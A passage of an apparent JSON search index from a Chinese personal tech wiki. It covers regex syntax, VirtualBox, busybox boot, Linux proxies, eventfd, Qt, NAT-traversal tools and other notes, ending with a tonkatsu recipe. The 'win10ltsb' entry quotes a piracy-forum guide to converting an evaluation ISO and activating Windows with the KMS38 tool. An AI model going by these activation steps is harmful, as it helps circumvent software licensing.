匹配输入字符串的结束位置。如果设置了RegExp对象的Multiline属性，$也匹配“\\n”或“\\r”之前的位置。 * 匹配前面的子表达式零次或多次。例如，zo能匹配“z”以及“zoo”。等价于{0,}。 + 匹配前面的子表达式一次或多次。例如，“zo+”能匹配“zo”以及“zoo”，但不能匹配“z”。+等价于{1,}。 ? 匹配前面的子表达式零次或一次。例如，“do(es)?”可以匹配“does”或“does”中的“do”。?等价于{0,1}。 {n} n是一个非负整数。匹配确定的n次。例如，“o{2}”不能匹配“Bob”中的“o”，但是能匹配“food”中的两个o。 {n,} n是一个非负整数。至少匹配n次。例如，“o{2,}”不能匹配“Bob”中的“o”，但能匹配“foooood”中的所有o。“o{1,}”等价于“o+”。“o{0,}”则等价于“o*”。 {n,m} m和n均为非负整数，其中n","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"}]},{"title":"虚拟机相关","date":"2019-06-21T00:00:00.000Z","path":"wiki/计算机/虚拟技术/虚拟机相关/","text":"虚拟机使用物理硬盘启动virtualbox比较好弄，vmware没弄通 linux下 查询硬盘id, 并创建raw映射文件:12ls -l /dev/disk/by-idVBoxManage internalcommands createrawvmdk -filename /path/to/file.vmdk -rawdisk /dev/disk/by-id/xxxxxx win1VBoxManage.exe internalcommands createrawvmdk -filename D:\\vm\\disk500.vmdk -rawdisk \\\\.\\PHYSICALDRIVE1 注意给权限，必要时勾选“使用主机I/O缓存” linux挂载vmdk安装vmware-workstation后得到vmware-mount工具 1sudo vmware-mount mint_work-home2.vmdk /mnt/vmdk virtualbox命令1VBoxManage startvm \"VM name\" --type --type可以是 gui：正常模式，关闭gui同时关闭虚拟机 sdl： headless：无界面启动 separate：分离式启动，关闭gui不会关闭虚拟机 PVE Proxmox 开源的虚拟化平台https://pve.proxmox.com/wiki/Main_Page 支持核显直通","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"虚拟技术","slug":"计算机/虚拟技术","permalink":"http://wiki.noodlefighter.com/categories/计算机/虚拟技术/"}]},{"title":"linux启动流程","date":"2019-06-19T00:00:00.000Z","path":"wiki/计算机/linux/linux启动流程/","text":"busybox构建的rootfs的linux启动流程环境: kernel挂载rootfs后，运行linuxrc, busybox解析/etc/inittab配置: 123456789101112131415161718192021222324# Startup the system::sysinit:/bin/mount -t proc proc /proc::sysinit:/bin/mount -o remount,rw /::sysinit:/bin/mkdir -p /dev/pts /dev/shm::sysinit:/bin/mount -a::sysinit:/sbin/swapon -anull::sysinit:/bin/ln -sf /proc/self/fd /dev/fdnull::sysinit:/bin/ln -sf /proc/self/fd/0 /dev/stdinnull::sysinit:/bin/ln -sf /proc/self/fd/1 /dev/stdoutnull::sysinit:/bin/ln -sf /proc/self/fd/2 /dev/stderr::sysinit:/bin/hostname -F /etc/hostname# now run any rc scripts::sysinit:/etc/init.d/rcS# Put a getty on the serial portconsole::respawn:/sbin/getty -L console 0 vt100 # GENERIC_SERIAL# Stuff to do for the 3-finger salute#::ctrlaltdel:/sbin/reboot# Stuff to do before rebooting::shutdown:/etc/init.d/rcK::shutdown:/sbin/swapoff -a::shutdown:/bin/umount -a -r 总结启动流程: 内核挂载rootfs, 执行linuxrc, 由它的配置文件/etc/inittab确定剩下的启动流程 先mount构造目录树: mount -a会挂载/etc/fstab中所有节点 执行/etc/init.d/rcS, rcS会按顺序遍历/etc/init.d/S* 使用getty, 将tty挂在串口上 用户登入后, 才会执行/etc/profile","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"linux网络相关工具","date":"2019-06-18T00:00:00.000Z","path":"wiki/计算机/linux/tools/linux网络相关工具/","text":"代理工具proxychanins 走代理的工具nc 瑞士军刀netcatsquid 正向、反向代理，web缓存 让chrome走代理1/usr/bin/google-chrome-stable --http-proxy=xxxx.net:8080 --https-proxy=xxxxx.net:8080 %U Linux设置代理（http） via: https://www.cnblogs.com/EasonJim/p/9826681.html 我谈一下这个http_proxy的设置，首先，设置了这个变量不是说只会走http协议，上面我说的应该是普通认为会这样说的说法，我后面觉得上面已经是错误了，比如curl，git这些软件默认使用http_proxy这个环境变量来设置代理服务器，所以在linux下只要设置了这个环境变量就能被这些软件识别，而对于代理服务器用什么协议都行，比如使用http协议或者socks协议等。 那么对于一些比如chrome和yum这些针对http_proxy可能不会生效，比如chrome用的是server_proxy这个变量，而且是在启动时设置才生效。 环境变量 描述 值示例 http_proxy 为http变量设置代理；默认不填开头以http协议传输 10.0.0.51:8080 user:pass@10.0.0.10:8080 socks4://10.0.0.51:1080 socks5://192.168.1.1:1080 https_proxy 为https变量设置代理； 同上 ftp_proxy 为ftp变量设置代理； 同上 all_proxy 全部变量设置代理，设置了这个时候上面的不用设置 同上 no_proxy 无需代理的主机或域名； 可以使用通配符； 多个时使用“,”号分隔； .aiezu.com,10...,192.168.., *.local,localhost,127.0.0.1 写入如下配置： 12345export proxy=\"http://192.168.5.14:8118\"export http_proxy=$proxyexport https_proxy=$proxyexport ftp_proxy=$proxyexport no_proxy=\"localhost, 127.0.0.1, ::1\" 而对于要取消设置可以使用如下命令，其实也就是取消环境变量的设置： 1234unset http_proxyunset https_proxyunset ftp_proxyunset no_proxy","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"snap打包方式","date":"2019-06-16T00:00:00.000Z","path":"wiki/计算机/linux/distribution/snap打包方式/","text":"https://snapcraft.io/","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"distribution","slug":"计算机/linux/distribution","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/distribution/"}]},{"title":"eventfd","date":"2019-06-16T00:00:00.000Z","path":"wiki/计算机/linux/kernel/eventfd/","text":"实际上就是linux kernel中通过eventfd()打开一个内核对象, 发送/接收双方通过read/write实现异步通知. via: https://linux.die.net/man/2/eventfd Description eventfd() creates an “eventfd object” that can be used as an event wait/notify mechanism by user-space applications, and by the kernel to notify user-space applications of events. The object contains an unsigned 64-bit integer (uint64_t) counter that is maintained by the kernel. This counter is initialized with the value specified in the argument initval. 其实就是内核对象中维护着uint64_t计数值, 默认情况下 write()的值会加在计数值上, 而read()会读出计数值并清零计数值. 一般用法就是: 接收方打开文件fd, 发送方写1来进行通知. 但也有flags中设置EFD_SEMAPHORE的用法, write()每次只能写入1, read()每次只能读出1, 行为就像多线程旗语中的信号量.","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"kernel","slug":"计算机/linux/kernel","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/kernel/"}]},{"title":"QT拖放","date":"2019-06-16T00:00:00.000Z","path":"wiki/计算机/编程/QT/qt拖放/","text":"via: https://www.cnblogs.com/findumars/p/5599427.html 子类中实现dragEnterEvent和dropEvent: 1234567891011121314151617181920212223//当用户拖动文件到窗口部件上时候，就会触发dragEnterEvent事件void MainWindow::dragEnterEvent(QDragEnterEvent *event){ //如果为文件，则支持拖放 if (event->mimeData()->hasFormat(\"text/uri-list\")) event->acceptProposedAction();} //当用户放下这个文件后，就会触发dropEvent事件void MainWindow::dropEvent(QDropEvent *event){ //注意：这里如果有多文件存在，意思是用户一下子拖动了多个文件，而不是拖动一个目录 //如果想读取整个目录，则在不同的操作平台下，自己编写函数实现读取整个目录文件名 QList urls = event->mimeData()->urls(); if(urls.isEmpty()) return; //往文本框中追加文件名 foreach(QUrl url, urls) { QString file_name = url.toLocalFile(); textEdit->append(file_name); }}","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"QT","slug":"计算机/编程/QT","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/QT/"}]},{"title":"达克效应","date":"2019-06-15T00:00:00.000Z","path":"wiki/心理学/达克效应/","text":"","tags":[],"categories":[{"name":"心理学","slug":"心理学","permalink":"http://wiki.noodlefighter.com/categories/心理学/"}]},{"title":"Netlink","date":"2019-06-15T00:00:00.000Z","path":"wiki/计算机/linux/kernel/netlink/","text":"Netlink套接字是用以实现用户进程与内核进程通信的一种特殊的进程间通信(IPC) ,也是网络应用程序与内核通信的最常用的接口。 netlink编写参考: https://blog.csdn.net/wangfeitaozhijia/article/details/44961651 https://blog.csdn.net/xiao5678yun/article/details/76922152 https://www.cnblogs.com/wenqiang/p/6306727.html","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"kernel","slug":"计算机/linux/kernel","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/kernel/"}]},{"title":"异步IO","date":"2019-06-15T00:00:00.000Z","path":"wiki/计算机/linux/kernel/异步io/","text":"SIGIO方式使用fcntl()传入pid号注册异步, 驱动通过raise SIGIO/SIGURG信号实现异步通知. SIGIO: 一般IO SIGURG: 紧急IO TODO: 整理 http://www.tutorialspoint.com/unix_system_calls/fcntl.htm https://blog.csdn.net/wangkaiblog/article/details/17596367","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"kernel","slug":"计算机/linux/kernel","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/kernel/"}]},{"title":"linux多用户管理","date":"2019-06-15T00:00:00.000Z","path":"wiki/计算机/linux/linux多用户管理/","text":"1234# 创建组$ sudo groupadd group# 将当前用户添加到指定组$ sudo gpasswd -a $USER group https://wiki.archlinux.org/index.php/users_and_groups","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"unix网络编程","date":"2019-06-15T00:00:00.000Z","path":"wiki/计算机/linux/unix网络编程/","text":"https://beej-zhtw-gitbook.netdpi.net/","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"}]},{"title":"win10ltsb","date":"2019-06-15T00:00:00.000Z","path":"wiki/计算机/windows/win10ltsb/","text":"下载安装 via: https://www.reddit.com/r/Piracy/comments/8pfnun/how_to_download_and_install_windows_10_ltsb/ Unfortunately you can’t upgrade from Windows 7/8/8.1 and normal Windows 10 editions (Home/Pro/Enterprise) to Enterprise LTSC 2019. You need to install it fresh. You can only upgrade from Enterprise LTSB 2016 to Enterprise LTSC 2019 and keep your programs and files. Step 1: Navigate to the s1ave77s SVF ISO converter tool GitLab page: https://gitlab.com/s1ave77/SVF.ISO.CONVERTER. Click on the small cloud icon and choose download zip. It should look like this. Step 2: Extract the downloaded zip file using a program like 7-zip. Step 3: Run svf.iso.converter.aio.cmd from the extracted folder. When the command prompt window is open: Type “M” to open the Visual Studio Downloads page (misleading I know) and then type “7” to start the LTSC 2019 Process. Follow the on-screen prompts such as your PC’s architecture, and language. I typed “6” to select the 64bit architecture and then I typed “0” and “8” to select the English (United States) language. The program will automatically download the latest Evaluation ISO from Microsoft’s servers and then convert it to a proper ISO of Windows 10 LTSC 2019. IMPORTANT: Once the process is done you will have two different iso files in the same folder as svf.iso.converter. One will be called “en_windows_10_enterprise_ltsc_2019_x64_dvd_74865958”. (For 32-bit versions you want to use en_windows_10_enterprise_ltsc_2019_x86_dvd_97449f83) DO NOT USE THE ISO THAT STARTS WITH “17763.1.180914-1434.rs5”. This is the evaluation ISO that cannot be activated. The ISO name includes capital letters and has the phrase “EVAL” in the name. You will want to use the ISO that uses lower case names. How do you activate? Check out this guide on HWIDGen, created by s1ave77 https://www.reddit.com/r/sjain_guides/comments/9qyuij/hwidkms38genmk6_download_and_usage_guide/ When running the tool, change the Work Mode to KMS38 instead of HWID.","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"windows","slug":"计算机/windows","permalink":"http://wiki.noodlefighter.com/categories/计算机/windows/"}]},{"title":"类似libevent的库","date":"2019-06-15T00:00:00.000Z","path":"wiki/计算机/编程/中间件/类似libevent的库/","text":"libeventlibevent是一个跨平台的异步信号库, 常用于网络高并发场景. http://libevent.org/ 入门: http://www.wangafu.net/~nickm/libevent-book/ libu","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"中间件","slug":"计算机/编程/中间件","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/中间件/"}]},{"title":"内网穿透","date":"2019-06-13T00:00:00.000Z","path":"wiki/计算机/计算机网络/内网穿透/","text":"参考： https://de.v2ex.com/t/539197 frphttps://github.com/fatedier/frp 特色是有个“点对点内网穿透”，打完洞后流量不走过服务器，但是测试发现成功率一般，不是太稳。 ngrokhttps://ngrok.com 在线服务，适合web测试吧。 这里有1.x版的服务端： https://github.com/inconshreveable/ngrok Mr.2https://github.com/txthinking/mr2 狗洞https://github.com/vzex/dog-tunnel socat标准的TCP打洞 https://github.com/craSH/socat","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"计算机网络","slug":"计算机/计算机网络","permalink":"http://wiki.noodlefighter.com/categories/计算机/计算机网络/"}]},{"title":"洗碗机","date":"2019-06-12T00:00:00.000Z","path":"wiki/日常/洗碗机/","text":"台式还是嵌入式居饼回复虾包:都要洗碗粉亮碟剂的吧，但是一定要装嵌入式的，台盆式的那种不好用 耗材 德国专业机构洗碗机耗材评测：洗碗块是否只有亮碟finish可用？ https://post.smzdm.com/p/alpz47gg/","tags":[],"categories":[{"name":"日常","slug":"日常","permalink":"http://wiki.noodlefighter.com/categories/日常/"}]},{"title":"编译相关","date":"2019-06-12T00:00:00.000Z","path":"wiki/计算机/linux/devtools/编译相关/","text":"编译调试打印更多信息 12345# 想看具体执行了什么命令make V=1# 想看makefile工作细节make --debug=v 常见问题没有规则可制作目标 文件名弄错了 搜索路径弄错了, 比如可以靠加搜索路径VPATH解决 没有指明目标并且找不到 makefile可能是找不到include的makefile文件, 用 make --debug=v就能看到具体错误的地方. 交叉编译设定库搜索路径1make LDFLAGS=\"-Wl,-rpath,/xxx/xx/libs\" 123456-Wl,optionPass option as an option to the linker. If option contains commas, it is split into multiple options at the commas. You can use this syntax to pass an argument to the option. For example, -Wl,-Map,output.map passes -Map output.map to the linker. When using the GNU linker, you can also get the same effect with `-Wl,-Map=output.map'.-rpath=dirAdd a directory to the runtime library search path. This is used when linking an ELF executable with shared objects. All -rpath arguments are concatenated and passed to the runtime linker, which uses them to locate shared objects at runtime. The -rpath option is also used when locating shared objects which are needed by shared objects explicitly included in the link; 设定sysroot1make LDFLAGS=\"--sysroot=/home/r/osp/buildroot-2019.02.1/output/host/arm-buildroot-linux-uclibcgnueabi/sysroot","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"devtools","slug":"计算机/linux/devtools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/devtools/"}]},{"title":"linux-list","date":"2019-06-12T00:00:00.000Z","path":"wiki/计算机/linux/kernel/linux-list/","text":"#include linux内核list数据结构用法 via: https://notes.shichao.io/lkd/ch6/#the-linux-kernels-implementation TODO: 别人移植好的, 用户态下能用的linux的list.hhttps://github.com/Akagi201/list/blob/master/list.h Here is a recipe to cook list.h for user space program. copy list.h from linux/include/list.h remove #ifdef KERNE and its #endif all #include line prefetch() and rcu related functions add macro offsetof() and container_of","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"kernel","slug":"计算机/linux/kernel","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/kernel/"}]},{"title":"iperf","date":"2019-06-12T00:00:00.000Z","path":"wiki/计算机/linux/tools/iperf/","text":"iperf是用于测试网络通讯质量的工具 常用参数 -s 服务端 -c 客户端 -i 显示报告的间隔 -l 读写缓冲区 -u 使用UDP而不是TCP -d 双向模式, 默认是客户端向服务端发数据 -r 往复模式, 完成测试后服务端反向连接到-L指定的端口 简单用法测试10秒, 每秒打印一次报告. 服务端 1iperf -s 客户端 1ipref -c [服务端地址] -t 10 -i 1 默认走5001端口","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"lrzsz","date":"2019-06-12T00:00:00.000Z","path":"wiki/计算机/linux/tools/lrzsz/","text":"lrzsz支持Zmodem协议收/发文件, 做服务端. 1234# Zmodem接收文件rz# Zmodem发送文件sz Zmodem协议: 串流式（streaming）传输方式，传输速度较快，而且还具有自动改变区段大小和断点续传、快速错误侦测 另外还有支持Xmodem的rx/sx命令 linux客户端minicom支持各种协议收发文件: Ctrl+A S: 发送文件 Ctrl+A R: 接收文件 Windows客户端Xshell和mobaxterm都有这方面支持","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"linux","slug":"计算机/linux","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/"},{"name":"tools","slug":"计算机/linux/tools","permalink":"http://wiki.noodlefighter.com/categories/计算机/linux/tools/"}]},{"title":"用CPP程序测试C","date":"2019-06-12T00:00:00.000Z","path":"wiki/计算机/编程/C/用cpp程序测试c/","text":"这是一次尝试, 但是失败了, 本来想用CPP的匿名函数特性方便写mock测试: 12345678910111213141516171819202122232425262728293031323334extern \"C\" {#include } // extern \"C\" // 编写set_mock()以动态改变skproto_evtpool_updated_hook的接收者std::function cur_hook;extern \"C\" {void skproto_evtpool_updated_hook(skproto_evtpool_t *obj, int evt_serial){ cur_hook(obj, evt_serial);}} // extern \"C\"void set_mock(std::function p_mock_func){ cur_hook = p_mock_func;}void test_normal_usage(void **state){ skproto_evtpool_t evtpool; int evt, arg; // init assert_true(skproto_evtpool_init(&evtpool) == 0); // case evt = 555; arg = 666; expect_value(xx); set_mock([=](skproto_evtpool_t *obj, int evt_serial) { check_expected_ptr(xxx); }); assert_true(skproto_evtpool_raise(&evtpool, evt, arg) == 0);} 但是发现cmocka的宏_check_expected用到了__func__, 这样就没法用匿名函数了.. 因为首先在expect_xxx宏中就要传入个函数名. 感觉可以试试gtest这种直接就是用来测试CPP的框架, 理由是: 线程安全, cmocka无法在多线程环境中的mock函数中做assert, 否则可能错误 支持C++11, 可以自然地使用匿名函数方便测试","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"},{"name":"C","slug":"计算机/编程/C","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/C/"}]},{"title":"web压力测试工具","date":"2019-06-12T00:00:00.000Z","path":"wiki/计算机/编程/web压力测试工具/","text":"go-boomhttps://github.com/tarekziade/boom HTTP(S) load generator, ApacheBench (ab) replacement, written in Go","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"编程","slug":"计算机/编程","permalink":"http://wiki.noodlefighter.com/categories/计算机/编程/"}]},{"title":"Golang开发嵌入式软件可行性","date":"2019-06-10T00:00:00.000Z","path":"wiki/电子工程/嵌入式软件/golang开发嵌入式软件可行性/","text":"TODO: Golang适合快速开发，有GC不用自己管理内存，能优雅地和C/C++混编。但它的runtime似乎没实时性保证，因为垃圾回收机制可能会Stop The World，这里研究一下可行性。 https://github.com/rakyll/go-hardware https://embd.kidoman.io/ https://qiita.com/tetsu_koba/items/7435ef8d0c77844d751e https://studygolang.com/articles/11904 https://blog.csdn.net/qq_15427331/article/details/54613635 https://www.zhihu.com/question/21615032/answers/created https://golang.org/doc/go1.10 https://blog.cloudflare.com/recycling-memory-buffers-in-go/ https://postd.cc/why-go-is-not-good/ http://blog.kmckk.com/archives/2712814.html https://mender.io/blog/why-did-we-choose-golang-over-c golang问题最大还是GC，即使不断优化，但还是用着老旧的算法，我们只能减少频繁创建对象，减轻GC的负担。 选用这种语言，很多时候是想利用他现成的库，如果那些库在设计的时候没这方面考量，那在嵌入式场合可能就不能直接拿来用（如果有go的嵌入式社区，可能又是另外一番景象了）","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式软件","slug":"电子工程/嵌入式软件","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式软件/"}]},{"title":"嵌入式软件快速原型开发的探索与思考","date":"2019-06-10T00:00:00.000Z","path":"wiki/电子工程/嵌入式软件/嵌入式软件快速原型开发的探索与思考/","text":"利用现有开源硬件平台 社区直接伸手 比如树莓派 arduino树莓派更像一个统一硬件的通用计算机 大概更适合IoT相关的原型 因为跑Linux 会更方便接入比如阿里云这种平台而不用动手移植 它的问题大概在驱动开发的门槛(？想当然的 毕竟要增加新硬件就得在内核态写驱动了)后者也有广泛社区支持 更重要的是能买到很多模组并配有相关驱动 可能更个“快速搭原型”吧 有机会会在下一个项目中尝试(残念 还没玩过arduino) 依托大厂的软件平台 比如mbed zephyr这些平台也提供了一系列硬件抽象接口 优点是更接近产品吧 弄个arduino板子在上面跑这些软件平台就能集成社区优势了 小众平台 它们通常强调语言 比如elua mjs micropython逐个看了下 可以说是玩具了 主要问题在于由于工具链不成熟缺少调试手段 现在做东西总想一版成 结果就是先搭好硬件画了板子直接写程序总有这样那样问题 还得吸取教训先搭原型啊","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式软件","slug":"电子工程/嵌入式软件","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式软件/"}]},{"title":"活动对象框架","date":"2019-06-10T00:00:00.000Z","path":"wiki/电子工程/嵌入式软件/活动对象框架/","text":"为嵌入式应用设计一套Activity框架，做个记录，思路大量借鉴了QP框架，但逻辑不使用QML状态机。 一个Activity，就是对象维护的线程+接收事件的队列+一系列事件处理逻辑。 Activity收到事件后，对事件作出相应，执行相应操作。 系统的任意部分都可以产生事件，比如软中断处理函数、别的线程，但处理事件的只有activity。 目的 模块间解耦，以发送事件的方式代替直接call 实现异步执行，call的串行化变相地实现了锁（同一时刻只处理一个事件），简化模块内部处理多线程同步问题 一些操作可以invoke到目标activity中执行，可以将逻辑实现写在发送者这边，避免代码分散 方便实现全局事件，比如通知系统即将断电（模块需要保存一些信息） 方便实现发行-订阅机制，任意一个模块（不一定是activity）都可以发行事件，而activity拥有接收槽可以接收事件 功能点 Activity的索引，小系统可以使用唯一编号，更大的系统用字符串似乎更好些 带优先级 延时执行，比如模块说“在xx秒后执行xxx函数”，比如方便做定时轮询、异步操作超时判断等，但时间太长会影响模块反初始化，所以得做被打断后的异常通知（在参数里传个）（不一定在这模块内实现） 为了方便做安全退出，activity需要有“即将反初始化禁止接收”的状态，以方便退出时清掉消息队列（可以查到这个状态以加速过程，比如异步执行的操作可能会很长时间）；需要退出时，禁止新数据接收，并向队列发发送一个“退出事件”，待 编程范式 Activity间不共享内存资源 Activity在处理事件时尽可能不阻塞 难点内存管理VxWorks的做法是把事件相关的数据全压进消息队列里，代价很高。 QP框架的做法是在框架内做一个公用的EventPool用来存放事件相关的内存： 事件的生产者从这里申请内存（初期可以用malloc实现），由于框架维护着Activity的线程，所以是能知道事件什么时候被处理完的，处理完后自动释放。 同时会有一些事件的参数很小，无需动态内存，这类事件得有一个静态内存的标记 当接收方不止一个时，这套管理方法就得加上引用计数器了，一开始不打算支持这功能。","tags":[],"categories":[{"name":"电子工程","slug":"电子工程","permalink":"http://wiki.noodlefighter.com/categories/电子工程/"},{"name":"嵌入式软件","slug":"电子工程/嵌入式软件","permalink":"http://wiki.noodlefighter.com/categories/电子工程/嵌入式软件/"}]},{"title":"草人的北酱时雨情人节黑童话","date":"2019-06-10T00:00:00.000Z","path":"wiki/自然语言/翻译/杂碎作品/草人的北酱时雨情人节黑童话/","text":"嗯。。","tags":[],"categories":[{"name":"自然语言","slug":"自然语言","permalink":"http://wiki.noodlefighter.com/categories/自然语言/"},{"name":"翻译","slug":"自然语言/翻译","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/"},{"name":"杂碎作品","slug":"自然语言/翻译/杂碎作品","permalink":"http://wiki.noodlefighter.com/categories/自然语言/翻译/杂碎作品/"}]},{"title":"可靠UDP传输","date":"2019-06-10T00:00:00.000Z","path":"wiki/计算机/计算机网络/可靠udp传输/","text":"ETUDP库第一次听说这个概念是“不死鸟”这个团队有实现可靠UDP库，网页十几年不变，现在还能访问： http://www.phoenixp2p.com/cn/etudp.htm 现在看看似乎没人在用 KCPhttps://github.com/skywind3000/kcp KCP是一个快速可靠协议，能以比 TCP浪费10%-20%的带宽的代价，换取平均延迟降低 30%-40%，且最大延迟降低三倍的传输效果。纯算法实现，并不负责底层协议（如UDP）的收发，需要使用者自己定义下层数据包的发送方式，以 callback的方式提供给 KCP。 连时钟都需要外部传递进来，内部不会有任何一次系统调用。 整个协议只有 ikcp.h, ikcp.c两个源文件，可以方便的集成到用户自己的协议栈中。也许你实现了一个P2P，或者某个基于 UDP的协议，而缺乏一套完善的ARQ可靠协议实现，那么简单的拷贝这两个文件到现有项目中，稍微编写两行代码，即可使用。","tags":[],"categories":[{"name":"计算机","slug":"计算机","permalink":"http://wiki.noodlefighter.com/categories/计算机/"},{"name":"计算机网络","slug":"计算机/计算机网络","permalink":"http://wiki.noodlefighter.com/categories/计算机/计算机网络/"}]},{"title":"btrfs和嵌入式","date":"2019-06-09T00:00:00.000Z","path":"wiki/待阅读后删除/btrfs和嵌入式/","text":"btrfs是嵌入式Linux的真正好朋友。 可能很多旁友还没有意识到这一点，我来展开讲一下。 设想uboot支持btrfs，包括subvolume，它可以从一个叫做boot的subvolume找到最初的boot.scr，这个script可以根据一些标记文件确定该从哪个subvol的/boot目录里载入kernel，initramfs和dtb，并正确的设置cmdline，使用这个subvol作为rootfs。这是策略一。 策略二是用于载入kernel等启动文件的subvol是一个只读的，kernel起来之后利用initramfs或者截获/sbin/init，立即从这个只读的subvol创建一个可写的subvolume副本，用这个副本作为rootfs启动系统，这样rootfs是可写的，同时每次重启所有的修改都挥发掉。兼顾了只读的健壮和linux hfs的读写要求。 比策略三更强的做法可以是每次reboot时前一次的读写subvol不必立即删除，可以维护一个列表这样每次启动对文件系统的修改以及log都在，非常有助于分析系统。 最后相信你也看出来了，用这种策略做a/b升级和recovery简直不要太爽。 那么我们最后说它和现在的嵌入式linux或者Android的最重要区别在哪里呢？ 就是抹去了所有分区之间的界限，这也是raid或btrfs这类系统的最初设计目标之一，术语上叫做pooling。虽然这不是在跨硬件介质的pooling，但是能够在一个卷上把所有系统镜像，升级要求，启动分区乃至用户数据都装下，不但可以利用snapshot管理系统，还可以用它管理应用程序（想想Ubuntu的snap）。刚真，这就是文件系统的真正未来，还具有绝佳的可扩展能力。 Android开发者曾经研究过btrfs，最终没有选做Android的rootfs是当时btrfs只有开放的加密接口但并没有一个solid的实现，于是谷歌就暂时没有选择btrfs。绝对堪称傻叉了。","tags":[],"categories":[{"name":"待阅读后删除","slug":"待阅读后删除","permalink":"http://wiki.noodlefighter.com/categories/待阅读后删除/"}]},{"title":"炸猪排","date":"2019-06-09T00:00:00.000Z","path":"wiki/日常/烹饪/油炸系/炸猪排/","text":"via: http://www.cafenavijp.com/tonkatu.htm おいしいトンカツの作り方/レシピハンバーグと並んで人気の高いトンカツ。おいしいトンカツを作るのは意外に簡単です。 材料 （３人前） 豚ロース ３６０～４５０ｇ 塩・コショウ 適量 小麦粉 適量 卵 １～２ヶ パン粉 適量 １．豚ロース（１人前１２０～１５０ｇ）についている余分な脂身を削ぎ落とします。 ２．包丁の切先で豚ロース全体を突き刺します（両面）。 ３．揚げたときに縮むのを防ぐため、切込みを入れます。 ４．全体を叩いて薄く伸ばします（片面でＯＫ）。 ５．塩・コショウを全体に薄くムラなく振り掛けます（両面）。 ６．小麦粉→卵→パン粉の順で衣を付けます。 ７．火加減は最初は中火で揚げます。 